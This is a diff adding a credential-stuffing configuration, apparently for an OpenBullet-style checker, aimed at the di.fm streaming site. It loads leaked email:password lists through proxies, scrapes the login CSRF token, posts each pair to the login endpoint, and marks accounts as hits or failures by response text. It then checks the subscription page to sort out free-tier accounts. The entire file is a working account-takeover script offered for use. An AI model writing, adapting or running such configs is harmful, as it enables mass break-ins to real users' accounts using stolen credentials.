@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "di.fm",
+  "SuggestedBots": 1,
+  "LastModified": "2018-11-10T20:21:10.6543115+00:00",
+  "AdditionalInfo": "",
+  "Author": "BulmaDB",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.di.fm/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "name=\"csrf-param\"/> <meta content=\"" "\" name" Recursive=FALSE -> VAR "TOKEN" "" "" 
+FUNCTION URLEncode "<USER>" -> VAR "USER2" 
+FUNCTION URLEncode "<TOKEN>" -> VAR "TOKEN2" 
+FUNCTION URLEncode "<PASS>" -> VAR "PASS2" 
+REQUEST POST "https://www.di.fm/login" AutoRedirect=FALSE 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<TOKEN2>&member_session%5Busername%5D=<USER2>&member_session%5Bpassword%5D=<PASS2>&member_session%5Bremember_me%5D=0&member_session%5Bremember_me%5D=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: www.di.fm" 
+  HEADER "Origin: https://www.di.fm" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Referer: https://www.di.fm/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password. Please try again.\",\"" 
+  KEYCHAIN Success OR 
+    KEY "/\">redirected</" 
+REQUEST GET "https://www.di.fm/member/subscription" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Free Listener" 
